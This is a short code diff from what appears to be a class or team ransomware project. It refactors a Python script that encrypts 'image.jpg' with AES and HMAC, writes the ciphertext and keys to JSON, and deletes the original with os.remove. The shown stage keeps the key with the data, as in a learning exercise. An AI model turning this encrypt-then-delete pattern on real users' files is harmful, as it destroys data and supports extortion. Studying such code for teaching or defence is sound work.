@@ -5,7 +5,7 @@ from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
 from cryptography.hazmat.primitives import (padding, hashes, hmac)
 
 fileToEncrypt = 'image.jpg'
-root = "C:/Users/Hanson/Desktop/Team-1/RansomWare/TestFiles"
+root = "/TestFiles"
 path = os.path.join(root, "targetdirectory")
 
 def FindFiles(root, path):
@@ -94,21 +94,25 @@ def MyFileEncrypt(filepath):
 def getExtension(filepath):
     return os.path.splitext(filepath)[1]
 
+def createJSON(cit, tag, iv, key, ext, hkey):
+    jsonData = {}
+    jsonData['cipherText'] = cit.decode('ISO-8859-1')
+    jsonData['tag'] = tag.decode('ISO-8859-1')
+    jsonData['iv'] = iv.decode('ISO-8859-1')
+    jsonData['key'] = key.decode('ISO-8859-1')
+    jsonData['extension'] = ext
+    jsonData['HMACKey'] = hkey.decode('ISO-8859-1')
+    return json.dumps(jsonData)
+
 cit, tag, iv, key, ext, hkey = MyFileEncrypt(fileToEncrypt)
 # # Optionally encrypt a separate file to have a tag to test the decryption verification
 # # cit2, tag2, iv2, key2, ext2, hkey2 = MyFileEncrypt("testText2.txt")
 
 #Create JSON formatted data
-jsonData = {}
-jsonData['cipherText'] = cit.decode('ISO-8859-1')
-jsonData['tag'] = tag.decode('ISO-8859-1')
-jsonData['iv'] = iv.decode('ISO-8859-1')
-jsonData['key'] = key.decode('ISO-8859-1')
-jsonData['extension'] = ext
-jsonData['HMACKey'] = hkey.decode('ISO-8859-1')
+
 
 # Dump the JSON data into the object
-jsonObj = json.dumps(jsonData)
+jsonObj = createJSON(cit, tag, iv, key, ext, hkey)
 # Delete original file
 os.remove(fileToEncrypt)
 # Create encrypted json file named the same as the original file with different extension
